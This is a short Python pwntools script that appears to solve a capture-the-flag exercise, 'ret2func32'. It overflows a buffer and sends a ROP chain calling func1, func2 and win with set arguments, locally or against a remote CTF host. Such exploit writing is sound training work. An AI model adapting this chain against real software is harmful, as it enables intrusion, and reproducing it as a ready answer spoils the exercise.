#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF(f"{dirname(__file__)}/../generate/ret2func32")
rop = ROP(elf)

rop.raw(b"A" * cyclic_find(0x61616174))
rop.call("func1", [0xdeadbeef])
rop.call("func2", [0xcafebabe])
rop.call("win", [next(elf.search(b"magicman\x00"))])


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript="continue")

    if args.REMOTE:
        return remote("pwn.platypew.social", 30004)

    return process(elf.path)


p = start()
p.sendline(rop.chain())

p.interactive()
